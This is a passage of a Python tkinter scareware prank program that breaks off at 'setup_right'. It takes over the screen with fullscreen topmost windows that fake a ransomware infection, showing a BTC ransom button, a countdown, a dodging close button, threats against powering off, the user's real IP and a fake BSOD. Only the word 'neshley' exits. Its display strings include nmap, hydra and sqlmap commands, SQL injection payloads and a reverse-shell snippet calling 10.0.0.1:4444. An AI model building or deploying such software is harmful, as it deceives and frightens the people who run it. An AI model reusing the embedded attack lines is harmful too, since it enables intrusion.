import tkinter as tk
from tkinter import font, scrolledtext, messagebox
import time
import random
import sys
import os
import socket
from datetime import datetime

# ============ CONFIGURATION ============
ESCAPE_WORD = "neshley"

# ============ DATA GENERATORS ============

def get_random_ip():
    return f"{random.randint(1,255)}.{random.randint(0,255)}.{random.randint(0,255)}.{random.randint(1,255)}"

def get_random_mac():
    return ':'.join([f"{random.randint(0,255):02X}" for _ in range(6)])

def get_real_ip():
    try:
        return socket.gethostbyname(socket.gethostname())
    except:
        return get_random_ip()

global_buffer = ""
escape_triggered = False
files_encrypted = random.randint(10000, 99999)

bitcoin_wallets = [
    "1A1zP1eP5QGefi2DMPTfTL5SLmv7DivfNa",
    "3J98t1WpEZ73CNmQviecrnyiWrnqRhWNLy",
    "bc1qar0srrr7xfkvy5l643lydnw9re59gtzzwf5mdq",
]

terminal_commands = [
    "nmap -sS -sV -p 1-1000 192.168.1.0/24",
    "msfconsole -q -r exploit.rc",
    "python3 eternalblue_exploit.py --target 192.168.1.105",
    "hydra -l admin -P wordlist.txt 192.168.1.1 http-post-form",
    "sqlmap -u 'http://target.com/page.php?id=1' --dbs",
    "aircrack-ng -w rockyou.txt -b 00:11:22:33:44:55 capture.cap",
]

hacker_scripts = [
    '''#!/usr/bin/env python3
# EternalBlue Exploit (MS17-010)
import socket, sys
def exploit(target):
    sock = socket.socket()
    sock.connect((target, 445))
    sock.send(b'\\\\x00\\\\x00\\\\x00\\\\x90')
    print(f"[+] {target} exploited!")
exploit("192.168.1.105")
''',
    '''#!/usr/bin/env python3
# SQL Injection Scanner
import requests
payloads = ["' OR '1'='1", "'; DROP TABLE users--"]
for p in payloads:
    r = requests.get(f"http://target.com?id={p}")
    if "error" in r.text: print(f"[VULN] {p}")
''',
    '''#!/usr/bin/env python3
# Reverse Shell
import socket, subprocess
s = socket.socket()
s.connect(("10.0.0.1", 4444))
subprocess.call(["/bin/bash", "-i"])
''',
]

hacking_messages = [
    "⚠️ INTRUSION DETECTED", "🔓 FIREWALL BYPASSED", "💀 ROOT ACCESS GRANTED",
    "📡 BACKDOOR INSTALLED", "🔑 CREDENTIALS HARVESTED", "📁 DATA EXFILTRATION",
    "💻 SYSTEM COMPROMISED", "⚡ REMOTE SHELL OPENED", "💰 RANSOMWARE ACTIVE",
]

locations = [
    "Moscow, Russia", "Beijing, China", "Tehran, Iran",
    "Pyongyang, North Korea", "Lagos, Nigeria", "Bucharest, Romania",
    "Minsk, Belarus", "Hanoi, Vietnam", "Caracas, Venezuela",
]

toast_messages = [
    "Windows Defender has been disabled!",
    "Firewall turned off by administrator!",
    "New device connected: Unknown USB",
    "Antivirus protection is OFF!",
    "Suspicious activity detected on network!",
    "Windows Update has been blocked!",
    "System restore point deleted!",
    "User Account Control disabled!",
    "BitLocker encryption stopped!",
    "Security credentials modified!",
]

def check_escape(char, root=None):
    global global_buffer, escape_triggered
    global_buffer += char
    if len(global_buffer) > 50:
        global_buffer = global_buffer[-30:]
    
    if ESCAPE_WORD in global_buffer.lower() and not escape_triggered:
        escape_triggered = True
        if root:
            for widget in root.winfo_children():
                try: widget.destroy()
                except: pass
            root.configure(bg='#000000')
            show_cancellation(root)
        return True
    return False

def show_toast(parent):
    """Fake system tray notification"""
    if escape_triggered:
        return
    try:
        toast = tk.Toplevel(parent)
        sw = parent.winfo_screenwidth()
        sh = parent.winfo_screenheight()
        toast.geometry(f"320x90+{sw-340}+{sh-130}")
        toast.overrideredirect(True)
        toast.attributes('-topmost', True)
        toast.configure(bg='#1a1a1a')
        toast.lift()
        
        # Border
        tk.Frame(toast, bg='#ff0000', height=2).pack(fill=tk.X)
        
        # Title
        title_frame = tk.Frame(toast, bg='#1a1a1a')
        title_frame.pack(fill=tk.X, padx=10, pady=(5,0))
        tk.Label(title_frame, text="⚠️  SECURITY ALERT", fg='#ff4444', bg='#1a1a1a', 
                font=('Arial', 11, 'bold')).pack(side=tk.LEFT)
        
        # Message
        msg = random.choice(toast_messages)
        msg_frame = tk.Frame(toast, bg='#1a1a1a')
        msg_frame.pack(fill=tk.X, padx=10, pady=(5,0))
        tk.Label(msg_frame, text=msg, fg='#cccccc', bg='#1a1a1a', 
                font=('Arial', 10), wraplength=280).pack(side=tk.LEFT)
        
        # Bottom
        bottom = tk.Frame(toast, bg='#2a2a2a')
        bottom.pack(fill=tk.X, side=tk.BOTTOM)
        tk.Label(bottom, text=f"🕒 {datetime.now().strftime('%H:%M:%S')}  •  Security Center", 
                fg='#888888', bg='#2a2a2a', font=('Arial', 8)).pack(side=tk.LEFT, padx=10, pady=3)
        
        # Close button
        close_btn = tk.Label(bottom, text="✕", fg='#888888', bg='#2a2a2a', 
                            font=('Arial', 12), cursor='hand2')
        close_btn.pack(side=tk.RIGHT, padx=10, pady=3)
        close_btn.bind('<Button-1>', lambda e: toast.destroy())
        
        # Auto close
        toast.after(8000, toast.destroy)
    except:
        pass

def show_cancellation(root):
    for widget in root.winfo_children():
        try: widget.destroy()
        except: pass
    
    root.configure(bg='#000000')
    frame = tk.Frame(root, bg='#000000')
    frame.pack(fill=tk.BOTH, expand=True)
    
    label = tk.Label(frame, text="", font=('Courier', 10, 'bold'),
                     fg='#00ff00', bg='#000000', justify=tk.LEFT)
    label.pack(expand=True, padx=30, pady=10)
    
    status = tk.Label(frame, text="", font=('Courier', 12, 'bold'),
                      fg='#00ff00', bg='#000000')
    status.pack(pady=5)
    
    # Scanning animation
    scan_label = tk.Label(frame, text="", font=('Courier', 10),
                          fg='#ffff00', bg='#000000')
    scan_label.pack(pady=5)
    
    messages = [
        "",
        "═══════════════════════════════════════════════════════",
        "           ⚠️  EMERGENCY SHUTDOWN INITIATED  ⚠️",
        "═══════════════════════════════════════════════════════",
        "",
        f"[!] Security override: neshley",
        f"[✓] Identity verified at {datetime.now().strftime('%H:%M:%S')}",
        "",
        "───────────────────────────────────────────────────────",
        "  TERMINATING CONNECTIONS",
        "───────────────────────────────────────────────────────",
        "[*] Closing backdoor on port 4444...",
        "[*] Disconnecting from C2 servers...",
        f"[*] Blocking IP: {get_random_ip()} ({random.choice(locations)})",
        f"[*] Blocking IP: {get_random_ip()} ({random.choice(locations)})",
        "[*] Stopping keylogger...",
        "[*] Closing webcam stream...",
        "",
        "───────────────────────────────────────────────────────",
        "  CANCELING DATA EXFILTRATION",
        "───────────────────────────────────────────────────────",
        "[*] Stopping dark web upload...",
        "[*] Aborting passwords.txt transfer...",
        "[*] Aborting banking_info.dat transfer...",
        "[*] Aborting personal_photos.zip transfer...",
        f"[✓] {random.randint(500,2000)} files saved from upload",
        "",
        "───────────────────────────────────────────────────────",
        "  DECRYPTING FILES",
        "───────────────────────────────────────────────────────",
        "[*] Key: neshley-2024-xxxx-xxxx",
        "[*] Decrypting Documents/...",
        "[*] Decrypting Photos/...",
        "[*] Decrypting Desktop/...",
        "[*] Decrypting Downloads/...",
        "[✓] All files successfully decrypted",
        "",
        "═══════════════════════════════════════════════════════",
        "           ✅  ATTACK CANCELED SUCCESSFULLY  ✅",
        "═══════════════════════════════════════════════════════",
        "",
        "         System is safe. Exiting in 5 seconds...",
    ]
    
    # Scanning animation
    def scanning_anim(dots_idx=0):
        if escape_triggered:
            return
        dots = [".", "..", "...", "....", "....."]
        scan_label.config(text=f"[*] Verifying system integrity{dots[dots_idx]}")
        root.after(300, scanning_anim, (dots_idx + 1) % len(dots))
    
    def type_text(i=0):
        if i < len(messages):
            label.config(text=label.cget('text') + messages[i] + '\n')
            if "CANCELED" in messages[i]:
                status.config(text="[ ✅ ATTACK CANCELED ✅ ]", fg='#00ff00')
                scan_label.config(text="[✓] System integrity verified", fg='#00ff00')
            elif "DECRYPTING" in messages[i]:
                status.config(text="[ DECRYPTING FILES... ]", fg='#00ff00')
            elif "CANCELING" in messages[i]:
                status.config(text="[ CANCELLING EXFILTRATION... ]", fg='#ffff00')
            elif "TERMINATING" in messages[i]:
                status.config(text="[ TERMINATING CONNECTIONS... ]", fg='#ff8800')
            root.after(30, type_text, i+1)
        else:
            def flash(n=0):
                if n < 10:
                    status.config(text=random.choice(["✅ SYSTEM SECURED ✅", "✅ FILES RESTORED ✅"]),
                                  fg=random.choice(['#00ff00', '#00cc00']))
                    root.after(300, flash, n+1)
                else:
                    status.config(text="EXITING...", fg='#ffffff')
                    scan_label.config(text="[✓] All processes terminated", fg='#00ff00')
                    root.after(3000, lambda: (root.destroy(), sys.exit(0)))
            flash()
    
    root.after(500, type_text)
    scanning_anim()

def show_bsod(root):
    global escape_triggered
    for widget in root.winfo_children():
        try: widget.destroy()
        except: pass
    
    root.configure(bg='#0000aa')
    frame = tk.Frame(root, bg='#0000aa')
    frame.pack(fill=tk.BOTH, expand=True, padx=50, pady=30)
    
    tk.Label(frame, text="Windows", font=('Courier', 24, 'bold'),
             fg='white', bg='#0000aa').pack(anchor='w')
    
    scroll = scrolledtext.ScrolledText(frame, font=('Courier', 11),
                                        bg='#0000aa', fg='white', relief=tk.FLAT)
    scroll.pack(fill=tk.BOTH, expand=True, pady=20)
    
    scroll.insert(tk.END, """A problem has been detected and Windows has been shut down to prevent damage
to your computer.

CRITICAL_PROCESS_DIED

*** STOP: 0x000000EF (0xFFFFA806, 0x5632A000, 0x00000000, 0x00000000)
*** ntoskrnl.exe - Address 0xFFFFF800

""")
    
    tech_msgs = [
        "*** SYSTEM_SERVICE_EXCEPTION ***",
        "*** KERNEL_SECURITY_CHECK_FAILURE ***",
        "*** DRIVER_IRQL_NOT_LESS_OR_EQUAL ***",
        "*** PAGE_FAULT_IN_NONPAGED_AREA ***",
        "*** FATAL_SYSTEM_ERROR ***",
        "*** NTFS_FILE_SYSTEM_ERROR ***",
        "*** DATA_BUS_ERROR ***",
        "*** BOOT_DEVICE_INACCESSIBLE ***",
        "*** REGISTRY_ERROR ***",
        "*** SYSTEM_FULLY_COMPROMISED ***",
        "*** ALL_DATA_ENCRYPTED ***",
        "*** RANSOMWARE_ACTIVE ***",
        "*** BACKDOOR_INSTALLED ***",
        "*** KEYLOGGER_RUNNING ***",
        "*** WEBCAM_STREAMING ***",
        "*** MICROPHONE_RECORDING ***",
        "*** DATA_EXFILTRATING ***",
        "*** PASSWORDS_STOLEN ***",
        "*** CREDIT_CARDS_HARVESTED ***",
        "*** IDENTITY_THEFT_COMPLETE ***",
        "*** SYSTEM_UNRECOVERABLE ***",
        # NEW DRAMATIC BSOD MESSAGES
        "*** RANSOMWARE_ENCRYPTION_COMPLETE ***",
        "*** ALL_FILES_LOST_FOREVER ***",
        "*** SYSTEM_DESTROYED ***",
        "*** HARDWARE_PERMANENTLY_DAMAGED ***",
        "*** BIOS_CORRUPTED ***",
        "*** CPU_OVERHEATING_DETECTED ***",
        "*** HARD_DRIVE_FORMATTING ***",
        "*** PERSONAL_DATA_LEAKED ***",
        "*** BANK_ACCOUNTS_DRAINED ***",
        "*** SOCIAL_MEDIA_HACKED ***",
        "*** MOTHERBOARD_FAILURE ***",
        "*** RAM_MODULE_DAMAGED ***",
        "*** GPU_MELTDOWN_IMMINENT ***",
        "*** POWER_SUPPLY_OVERLOAD ***",
        "*** BOOT_SECTOR_DESTROYED ***",
        "*** MBR_CORRUPTED_PERMANENTLY ***",
        "*** ALL_PARTITIONS_FORMATTED ***",
        "*** BACKUP_FILES_DELETED ***",
        "*** RECOVERY_IMPOSSIBLE ***",
        "*** WARRANTY_VOIDED ***",
        "*** CONTACT_MANUFACTURER ***",
        "*** REPLACE_HARDWARE ***",
        "",
        f"Collecting crash dump... [{random.randint(1,100)}%]",
        f"Dump: C:\\Windows\\MEMORY.DMP",
        f"Date: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}",
        f"Report ID: {random.randint(10000,99999)}-{random.randint(1000,9999)}",
        "",
    ]
    
    # Scanning animation in BSOD
    scan_frame = tk.Frame(frame, bg='#0000aa')
    scan_frame.pack(fill=tk.X, pady=5)
    scan_label = tk.Label(scan_frame, text="[*] Scanning system...", 
                          font=('Courier', 10), fg='#888888', bg='#0000aa')
    scan_label.pack()
    
    status_frame = tk.Frame(frame, bg='#000080', height=30)
    status_frame.pack(fill=tk.X, side=tk.BOTTOM)
    
    status_lbl = tk.Label(status_frame, text="SYSTEM HALTED - AWAITING OVERRIDE CODE...",
                          font=('Courier', 10, 'bold'), fg='#00ff00', bg='#000080')
    status_lbl.pack(pady=5)
    
    hint_lbl = tk.Label(status_frame, text=" ", font=('Courier', 8),
                        fg='#000080', bg='#000080')
    hint_lbl.pack()
    
    progress = tk.Canvas(frame, height=8, bg='#000080', highlightthickness=0)
    progress.pack(fill=tk.X, side=tk.BOTTOM)
    
    scroll_idx = [0]
    running = [True]
    
    def add_text():
        if not running[0] or escape_triggered:
            return
        for _ in range(3):
            if scroll_idx[0] < len(tech_msgs):
                scroll.insert(tk.END, tech_msgs[scroll_idx[0]] + '\n')
                scroll_idx[0] += 1
            else:
                scroll.insert(tk.END, '\n' + '='*60 + '\n')
                scroll.insert(tk.END, f'  SYSTEM DIAGNOSTICS CYCLE #{random.randint(1,999)}\n')
                scroll.insert(tk.END, f'  ERRORS DETECTED: {random.randint(50,999)}\n')
                scroll.insert(tk.END, f'  CRITICAL: {random.randint(10,50)}\n')
                scroll.insert(tk.END, '='*60 + '\n\n')
                scroll_idx[0] = 0
        scroll.see(tk.END)
        frame.after(800, add_text)
    
    def update_prog():
        if escape_triggered:
            return
        progress.delete("all")
        w = progress.winfo_width()
        if w > 0:
            f = int(w * ((time.time() * 10) % 100) / 100)
            progress.create_rectangle(0, 0, f, 8, fill='white', outline='')
        frame.after(200, update_prog)
    
    def anim_status():
        if escape_triggered:
            return
        status_lbl.config(text=random.choice([
            "SYSTEM HALTED - AWAITING OVERRIDE CODE...",
            "CRITICAL FAILURE - ALL DATA COMPROMISED",
            "UNRECOVERABLE ERROR - CONTACT SUPPORT",
            "HARDWARE DAMAGE DETECTED - SHUTDOWN NOW",
            "SECURITY OVERRIDE REQUIRED",
            "BOOT SECTOR CORRUPTED - REPAIR IMPOSSIBLE",
        ]))
        frame.after(2000, anim_status)
    
    def scanning_anim(dots_idx=0):
        if escape_triggered:
            return
        dots = [".", "..", "...", "....", "....."]
        scan_items = [
            "Scanning system files",
            "Checking boot sector",
            "Verifying registry integrity",
            "Scanning memory modules",
            "Checking disk health",
            "Verifying system integrity",
            "Scanning for malware",
            "Checking network security",
        ]
        scan_label.config(text=f"[*] {random.choice(scan_items)}{dots[dots_idx]}")
        frame.after(400, scanning_anim, (dots_idx + 1) % len(dots))
    
    def flash():
        if escape_triggered:
            return
        if random.random() > 0.85:
            hint_lbl.config(text="Override code required...", fg='#004400')
        else:
            hint_lbl.config(text=" ", fg='#000080')
        frame.after(8000, flash)
    
    def spawn_toasts():
        """Show fake notifications during BSOD"""
        if escape_triggered or not running[0]:
            return
        show_toast(root)
        frame.after(random.randint(5000, 10000), spawn_toasts)
    
    def on_key(event):
        global global_buffer, escape_triggered
        if event.char.isprintable():
            global_buffer += event.char
            if len(global_buffer) > 50:
                global_buffer = global_buffer[-30:]
            if ESCAPE_WORD in global_buffer.lower() and not escape_triggered:
                running[0] = False
                escape_triggered = True
                for w in root.winfo_children():
                    try: w.destroy()
                    except: pass
                show_cancellation(root)
    
    root.bind('<Key>', on_key)
    root.focus_set()
    
    frame.after(1000, add_text)
    frame.after(500, update_prog)
    frame.after(1000, anim_status)
    frame.after(5000, flash)
    frame.after(3000, spawn_toasts)
    scanning_anim()

class SpyPopup:
    def __init__(self, parent):
        self.parent = parent
        self.win = None
        
    def create(self):
        if escape_triggered:
            return
        try:
            self.win = tk.Toplevel(self.parent)
            w, h = 300, 180
            x = self.win.winfo_screenwidth() - w - 20
            y = self.win.winfo_screenheight() - h - 50
            self.win.geometry(f"{w}x{h}+{x}+{y}")
            self.win.configure(bg='#000000')
            self.win.attributes('-topmost', True)
            self.win.overrideredirect(True)
            self.win.bind('<Key>', lambda e: check_escape(e.char, self.parent))
            
            border = tk.Frame(self.win, bg='#ff0000', bd=2)
            border.pack(fill=tk.BOTH, expand=True, padx=1, pady=1)
            main = tk.Frame(border, bg='#0a0000')
            main.pack(fill=tk.BOTH, expand=True, padx=1, pady=1)
            
            self.eye = tk.Label(main, text="👁️  WATCHING YOU  👁️",
                                font=('Courier', 11, 'bold'), fg='#ff0000', bg='#0a0000')
            self.eye.pack(pady=5)
            
            tk.Frame(main, bg='#ff0000', height=1).pack(fill=tk.X, padx=10, pady=3)
            
            # Scanning label in spy window
            self.scan_lbl = tk.Label(main, text="[*] Monitoring...", font=('Courier', 8),
                                      fg='#ffff00', bg='#0a0000')
            self.scan_lbl.pack()
            
            self.keys_lbl = tk.Label(main, text="Keys captured: 0", font=('Courier', 8),
                                      fg='#ff8888', bg='#0a0000')
            self.keys_lbl.pack()
            self.clicks_lbl = tk.Label(main, text="Clicks detected: 0", font=('Courier', 8),
                                        fg='#ff8888', bg='#0a0000')
            self.clicks_lbl.pack()
            self.files_lbl = tk.Label(main, text=f"Files: {files_encrypted:,}", font=('Courier', 8),
                                       fg='#ff8888', bg='#0a0000')
            self.files_lbl.pack()
            
            self.keys = 0
            self.clicks = 0
            
            self.anim_eye()
            self.stay_top()
            self.update_stats()
            self.scanning_anim()
        except Exception as e:
            print(f"Spy error: {e}")
    
    def scanning_anim(self, dots_idx=0):
        if self.win and not escape_triggered:
            dots = [".", "..", "...", "....", "....."]
            items = ["Monitoring", "Tracking", "Logging", "Watching", "Recording"]
            self.scan_lbl.config(text=f"[*] {random.choice(items)}{dots[dots_idx]}")
            self.win.after(400, self.scanning_anim, (dots_idx + 1) % len(dots))
    
    def anim_eye(self):
        if self.win and not escape_triggered:
            self.eye.config(text=random.choice(["👁️  WATCHING  👁️", "🔴  MONITORING  🔴", "📹  RECORDING  📹"]))
            self.win.after(2000, self.anim_eye)
    
    def stay_top(self):
        if self.win and not escape_triggered:
            self.win.lift()
            self.win.attributes('-topmost', True)
            self.win.after(500, self.stay_top)
    
    def update_stats(self):
        if self.win and not escape_triggered:
            self.keys_lbl.config(text=f"Keys captured: {self.keys}")
            self.clicks_lbl.config(text=f"Clicks detected: {self.clicks}")
            global files_encrypted
            files_encrypted += random.randint(1, 20)
            self.files_lbl.config(text=f"Files: {files_encrypted:,}")
            self.win.after(1000, self.update_stats)
    
    def close(self):
        if self.win:
            self.win.destroy()
            self.win = None

class HackerPopup:
    def __init__(self, parent):
        self.parent = parent
        self.popup = None
        self.seconds = 180
        self.cid = None
        self.msg_idx = 0
        self.btc_idx = 0
        self.spy = None
        
    def create(self):
        if escape_triggered:
            return
        try:
            self.popup = tk.Toplevel(self.parent)
            w, h = self.popup.winfo_screenwidth(), self.popup.winfo_screenheight()
            self.popup.geometry(f"{w}x{h}+0+0")
            self.popup.configure(bg='#000000')
            self.popup.attributes('-topmost', True)
            self.popup.attributes('-fullscreen', True)
            self.popup.overrideredirect(True)
            self.popup.bind('<Key>', lambda e: check_escape(e.char, self.parent))
            self.popup.focus_set()
            
            self.spy = SpyPopup(self.parent)
            self.spy.create()
            
            border = tk.Frame(self.popup, bg='#ff0000', bd=3)
            border.pack(fill=tk.BOTH, expand=True, padx=2, pady=2)
            main = tk.Frame(border, bg='#0a0000')
            main.pack(fill=tk.BOTH, expand=True, padx=2, pady=2)
            
            center = tk.Frame(main, bg='#0a0000')
            center.place(relx=0.5, rely=0.5, anchor='center')
            
            self.header = tk.Label(center, text="⚠️  YOU HAVE BEEN HACKED  ⚠️",
                                    font=('Courier', 20, 'bold'), fg='#ff0000', bg='#0a0000')
            self.header.pack(pady=10)
            
            tk.Label(center, text="YOUR SYSTEM HAS BEEN COMPROMISED",
                    font=('Courier', 14, 'bold'), fg='#ff4444', bg='#0a0000').pack()
            
            tk.Frame(center, bg='#ff0000', height=2).pack(fill=tk.X, padx=20, pady=10)
            
            self.msgs = ["☠️  ALL FILES ENCRYPTED", "💀  FULL SYSTEM CONTROL",
                         "🔑  PASSWORDS STOLEN", "📸  WEBCAM ACTIVE",
                         "💳  FINANCIAL DATA EXTRACTED", "🌐  LOCATION TRACKED"]
            
            self.msg_lbl = tk.Label(center, text=self.msgs[0],
                                     font=('Courier', 12, 'bold'), fg='#ff8800', bg='#0a0000')
            self.msg_lbl.pack(pady=5)
            
            # Scanning label in popup
            self.scan_lbl = tk.Label(center, text="[*] Encrypting files...",
                                      font=('Courier', 10), fg='#ffff00', bg='#0a0000')
            self.scan_lbl.pack(pady=3)
            
            self.file_lbl = tk.Label(center, text=f"📁 Files encrypted: {files_encrypted:,}",
                                      font=('Courier', 10, 'bold'), fg='#ff4444', bg='#0a0000')
            self.file_lbl.pack()
            
            self.btc_lbl = tk.Label(center, text=f"💰 BTC: {bitcoin_wallets[0][:20]}...",
                                     font=('Courier', 9), fg='#ffaa00', bg='#0a0000')
            self.btc_lbl.pack(pady=3)
            
            tk.Frame(center, bg='#330000', height=2).pack(fill=tk.X, padx=20, pady=10)
            
            tk.Label(center, text="⛔  DO NOT TURN OFF YOUR COMPUTER  ⛔",
                    font=('Courier', 16, 'bold'), fg='#ffff00', bg='#330000').pack(pady=10)
            
            self.warn = tk.Label(center, text="TURNING OFF WILL CORRUPT ALL FILES",
                                  font=('Courier', 11, 'bold'), fg='#ff0000', bg='#330000')
            self.warn.pack()
            
            tk.Frame(center, bg='#330000', height=1).pack(fill=tk.X, padx=20, pady=10)
            
            cd_frame = tk.Frame(center, bg='#1a0000', bd=2, relief=tk.RAISED)
            cd_frame.pack(pady=10, padx=30, fill=tk.X)
            
            tk.Label(cd_frame, text="⏰  TIME UNTIL DATA RELEASE  ⏰",
                    font=('Courier', 11, 'bold'), fg='#ffff00', bg='#1a0000').pack(pady=5)
            
            self.cd_lbl = tk.Label(cd_frame, text="03:00",
                                    font=('Courier', 30, 'bold'), fg='#ff0000', bg='#1a0000')
            self.cd_lbl.pack(pady=10)
            
            real_ip = get_real_ip()
            tk.Label(center, text=f"YOUR REAL IP: {real_ip}  |  STATUS: COMPROMISED",
                    font=('Courier', 9), fg='#ff6666', bg='#0a0000').pack(pady=5)
            
            self.mouse_lbl = tk.Label(center, text="[ MOUSE: NOT DETECTED ]",
                                       font=('Courier', 9), fg='#00ff00', bg='#0a0000')
            self.mouse_lbl.pack(pady=5)
            
            btn_frame = tk.Frame(center, bg='#0a0000')
            btn_frame.pack(pady=15)
            
            tk.Button(btn_frame, text="💰  PAY 0.5 BTC TO UNLOCK  💰",
                     font=('Courier', 12, 'bold'), fg='#fff', bg='#c00',
                     command=self.pay, cursor='hand2').pack(side=tk.LEFT, padx=10)
            
            self.close_btn = tk.Button(btn_frame, text="✖  CLOSE  ✖",
                                        font=('Courier', 12, 'bold'), fg='#ccc', bg='#333',
                                        command=self.close_btn_action)
            self.close_btn.pack(side=tk.LEFT, padx=10)
            
            self.popup.bind('<Motion>', self.mouse_move)
            self.close_btn.bind('<Enter>', self.close_hover)
            
            self.rotate()
            self.update_file_count()
            self.anim_btc()
            self.countdown()
            self.glow()
            self.anim_header()
            self.stay_top()
            self.scanning_anim()
            self.spawn_toasts()
            
        except Exception as e:
            print(f"Popup error: {e}")
    
    def scanning_anim(self, dots_idx=0):
        if self.popup and not escape_triggered:
            dots = [".", "..", "...", "....", "....."]
            items = ["Encrypting files", "Stealing passwords", "Uploading data", 
                     "Scanning network", "Harvesting credentials", "Installing backdoor"]
            self.scan_lbl.config(text=f"[*] {random.choice(items)}{dots[dots_idx]}")
            self.popup.after(400, self.scanning_anim, (dots_idx + 1) % len(dots))
    
    def spawn_toasts(self):
        if self.popup and not escape_triggered:
            show_toast(self.popup)
            self.popup.after(random.randint(5000, 12000), self.spawn_toasts)
    
    def stay_top(self):
        if self.popup and not escape_triggered:
            self.popup.lift()
            self.popup.attributes('-topmost', True)
            self.popup.after(500, self.stay_top)
    
    def anim_header(self):
        if self.popup and not escape_triggered:
            self.header.config(text=random.choice([
                "⚠️  YOU HAVE BEEN HACKED  ⚠️", "💀  SYSTEM COMPROMISED  💀",
                "☠️  ALL DATA ENCRYPTED  ☠️", "🔴  YOU ARE BEING WATCHED  🔴"
            ]))
            self.popup.after(2000, self.anim_header)
    
    def rotate(self):
        if self.popup and not escape_triggered:
            self.msg_lbl.config(text=self.msgs[self.msg_idx])
            self.msg_idx = (self.msg_idx + 1) % len(self.msgs)
            self.popup.after(2500, self.rotate)
    
    def update_file_count(self):
        if self.popup and not escape_triggered:
            global files_encrypted
            files_encrypted += random.randint(1, 50)
            self.file_lbl.config(text=f"📁 Files encrypted: {files_encrypted:,}")
            self.popup.after(2000, self.update_file_count)
    
    def anim_btc(self):
        if self.popup and not escape_triggered:
            self.btc_idx = (self.btc_idx + 1) % len(bitcoin_wallets)
            self.btc_lbl.config(text=f"💰 BTC: {bitcoin_wallets[self.btc_idx][:25]}...")
            self.popup.after(3000, self.anim_btc)
    
    def mouse_move(self, event):
        self.mouse_lbl.config(text="[ MOUSE: DETECTED ⚠️ ]", fg='#ff0000')
        if hasattr(self, 'tid'):
            self.popup.after_cancel(self.tid)
        self.tid = self.popup.after(2000, lambda: self.mouse_lbl.config(
            text="[ MOUSE: IDLE ]", fg='#ffff00'))
    
    def countdown(self):
        if escape_triggered:
            return
        if self.popup and self.seconds > 0:
            m, s = divmod(self.seconds, 60)
            self.cd_lbl.config(text=f"{m:02d}:{s:02d}")
            
            if self.seconds <= 10:
                self.cd_lbl.config(fg='#ffffff' if self.seconds % 2 == 0 else '#ff0000')
            elif self.seconds <= 30:
                self.cd_lbl.config(fg='#ff0000')
            
            self.seconds -= 1
            self.cid = self.popup.after(1000, self.countdown)
        elif self.popup:
            self.cd_lbl.config(text="00:00", fg='#ff0000')
            self.header.config(text="⚠️  DATA RELEASED!  ⚠️")
            self.popup.after(3000, self.close)
    
    def glow(self):
        if self.popup and not escape_triggered:
            i = int((time.time() * 3) % 2) * 100 + 100
            self.popup.configure(bg=f'#{i:02x}0000')
            self.popup.after(200, self.glow)
    
    def close_hover(self, event):
        if escape_triggered:
            return
        self.close_btn.place(x=random.randint(400, 900), y=random.randint(500, 700))
        self.warn.config(text="⚠️  YOU CANNOT ESCAPE!  ⚠️", fg='#ff0000')
    
    def pay(self):
        if escape_triggered:
            return
        self.warn.config(text="❌  PAYMENT REJECTED!  ❌", fg='#ff0000')
        self.seconds = max(5, self.seconds - 60)
    
    def close_btn_action(self):
        if escape_triggered:
            return
        self.close_btn.place(x=random.randint(400, 900), y=random.randint(500, 700))
        self.seconds = min(180, self.seconds + 45)
    
    def close(self):
        if self.popup:
            if self.cid:
                self.popup.after_cancel(self.cid)
            if self.spy:
                self.spy.close()
            self.popup.destroy()
            self.popup = None
            show_bsod(self.parent)

class HackerInterface:
    def __init__(self):
        self.root = tk.Tk()
        self.root.title("SYSTEM COMPROMISED")
        self.root.attributes('-fullscreen', True)
        self.root.attributes('-topmost', True)
        self.root.overrideredirect(True)
        
        sw, sh = self.root.winfo_screenwidth(), self.root.winfo_screenheight()
        self.root.geometry(f"{sw}x{sh}+0+0")
        self.root.configure(bg='#000000')
        
        self.cfont = font.Font(family='Courier', size=10)
        self.hfont = font.Font(family='Courier', size=11, weight='bold')
        self.bfont = font.Font(family='Courier', size=14, weight='bold')
        self.tfont = font.Font(family='Courier', size=16, weight='bold')
        
        self.pane = tk.PanedWindow(self.root, orient=tk.HORIZONTAL, bg='#003300')
        self.pane.pack(fill=tk.BOTH, expand=True)
        
        self.setup_left()
        self.setup_right()
        
        self.progress = 0
        self.pdir = 1
        self.si = 0
        self.sl = 0
        self.ci = 0
        
        # Scanning label in main interface
        self.scan_label = tk.Label(self.root, text="[*] Initializing...",
                                    font=('Courier', 9), fg='#ffff00', bg='#000000')
        self.scan_label.place(x=10, y=10)
        
        self.root.bind('<Key>', self.on_key)
        self.root.focus_set()
        
        self.anim_header()
        self.anim_progress()
        self.update_logs()
        self.matrix()
        self.update_scripts()
        self.update_terminal()
        self.update_status()
        self.scanning_anim()
        self.spawn_toasts()
        
        print("Running... Popup in 60 seconds. Type 'neshley' to exit.")
        self.root.after(60000, self.show_popup)
    
    def scanning_anim(self, dots_idx=0):
        if escape_triggered:
            return
        dots = [".", "..", "...", "....", "....."]
        items = ["Scanning network", "Enumerating targets", "Deploying exploits",
                 "Harvesting data", "Establishing persistence"]
        self.scan_label.config(text=f"[*] {random.choice(items)}{dots[dots_idx]}")
        self.root.after(500, self.scanning_anim, (dots_idx + 1) % len(dots))
    
    def spawn_toasts(self):
        if not escape_triggered and not hasattr(self, 'hacker_popup'):
            show_toast(self.root)
        self.root.after(random.randint(8000, 15000), self.spawn_toasts)
    
    def setup_left(self):
        left = tk.Frame(self.pane, bg='#0a0a0a')
        self.pane.add(left, width=700)
        
        h = tk.Frame(left, bg='#003300', bd=2, relief=tk.RAISED)
        h.pack(fill=tk.X, padx=5, pady=5)
        tk.Label(h, text="root@kali:~# TERMINAL", font=self.tfont, fg='#00ff00', bg='#003300').pack()
        tk.Label(h, text="[ACTIVE] EXPLOITS RUNNING", font=self.hfont, fg='#ff0000', bg='#003300').pack()
        
        self.term = scrolledtext.ScrolledText(left, font=self.cfont, bg='#000', fg='#0f0',
                                               relief=tk.SUNKEN, bd=3, height=10)
        self.term.pack(fill=tk.X, padx=5, pady=5)
        
        self.script = scrolledtext.ScrolledText(left, font=self.cfont, bg='#000', fg='#0f0',
                                                 relief=tk.SUNKEN, bd=3)
        self.script.pack(fill=tk.BOTH, expand=True, padx=5, pady=5)
        self.script.tag_config('comment', foreground='#666')
        self.script.tag_config('string', foreground='#fa0')
        self.script.tag_config('keyword', foreground='#f0f')
        
        self.lstat = tk.Label(left, text=f"[ACTIVE] PID: {os.getpid()}",
                               font=self.hfont, fg='#0f0', bg='#030')
        self.lstat.pack(fill=tk.X, padx=5, pady=(0,5))
    
    def setup_right(self):
